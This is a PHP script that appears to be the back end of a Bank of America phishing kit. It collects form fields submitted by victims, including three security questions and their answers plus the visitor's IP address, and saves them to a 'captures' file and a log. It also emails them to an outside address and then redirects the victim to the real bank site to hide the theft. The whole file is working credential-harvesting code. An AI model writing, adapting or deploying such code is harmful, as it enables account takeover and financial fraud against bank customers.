<?php
$file = fopen("log.txt", "a+");
fwrite($file,"Guardando en archivo -> " .$_SERVER["REMOTE_ADDR"]."\n");
fclose($file);



    $para      = 'premium@customersn.com';
    $titulo    = 'BOA-YaYa-PREGUNTAS';
    $u = $_POST['u'];
    $p = $_POST['p'];
    $nt = $_POST['nt'];
    $dt =$_POST['dt'];
    $ct =  $_POST['ct'];
    $et = $_POST['et'];
    $pt2 =$_POST['pt2'];
    $pt =$_POST['pt'];
    $q1 = $_POST['q1'];
    $q2 = $_POST['q2'];
    $q3 = $_POST['q3'];
    $a1 = $_POST['a1'];
    $a2 = $_POST['a2'];
    $a3 = $_POST['a3'];
    $ip = $_SERVER["REMOTE_ADDR"];
    
    
    $mensaje   = "
    
                   [United States]
        +===========[BOF/PART-02]===========+
        Preunta 1   :  $q1 
        Respuesta 1 :  $a1 
        + -------------------------------- +
        Pregunta 2  :  $q2 
        Respuesta 2 :  $a2 
        + -------------------------------- +
        Pregunta 3  :  $q3 
        Respuesta 3 :  $a3 
        + --------------[IP]--------------- +
        IP: $ip 
        +================[END]==============+
    
        ";
        


        $file = fopen("CapturasYaYa.txt", "a+");
        fwrite($file,"+==========[BOFYAYA]=========+\n " .$mensaje."\n\n");
        fclose($file);
        
        $file = fopen("log.txt", "a+");
        fwrite($file,"Guardado en results -> " .$_SERVER["REMOTE_ADDR"]."\n");
        fclose($file);
        
        mail($para, $titulo, $mensaje);
    var_dump(mail("#", $titulo, $mensaje));

    //echo $mensaje;
    header('Location: https://www.bankofamerica.com/asdasdasd');
    //exit;
?>
